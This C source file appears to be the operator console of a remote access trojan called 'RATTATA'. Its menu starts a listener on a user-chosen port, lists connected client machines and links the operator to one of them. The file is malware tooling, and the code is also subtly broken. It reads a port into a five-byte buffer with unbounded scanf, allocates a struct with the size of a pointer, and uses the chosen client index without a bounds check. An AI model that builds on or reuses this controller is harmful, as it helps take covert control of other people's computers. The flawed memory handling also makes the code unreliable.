#include "../headers/header.h"

void logprint(char *type, char *message)
{
    if (strcmp(type, "ERROR") == 0)
    {
        printf("[-]%s\n", message);
    }
    else if (strcmp(type, "SUCCESS") == 0)
    {
        printf("[+]%s\n", message);
    }
}

void menu()
{
    char port[5];
    SOCKET listener;
    int choice = 0;
    
    printf("RATTATA >>\n");
    printf("1 - Start a new server.\n2 - View clients\n3 - Exit\nEnter choice : ");
    scanf("%d", &choice);
    if (choice == 1)
    {
        printf("Listening PORT : ");
        scanf("%s", port);

        listener = init_listener(port);

        pDataArray[THREADNBR] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
        if (pDataArray[THREADNBR] == NULL)
        {
            ExitProcess(2);
        }
        pDataArray[THREADNBR]->Listener = listener;
        pDataArray[THREADNBR]->iport = malloc(5*sizeof(char));
        strcpy(pDataArray[THREADNBR]->iport, port);

        init_client_thread(pDataArray[THREADNBR]);
    }
    else if (choice == 2)
    {
        int trigger = 0;
        for (int i = 1; i < MAX_CLIENTS; i++)
        {
            if (PClients[i]->id)
            {
                trigger = 1;
                printf("%d Client\n", PClients[i]->id);
            }
        }
        if (trigger)
        {
            printf("Enter 0 to exit.\n");
            printf("Choose a client : ");
            scanf("%d", &choice);
            if (choice != 0)
            {
                link_client(PClients[choice]);
            }
        }
        else
        {
            printf("No client connected.\n");
        }
    }
    else if (choice == 3)
    {
        ExitProcess(1);
    }
}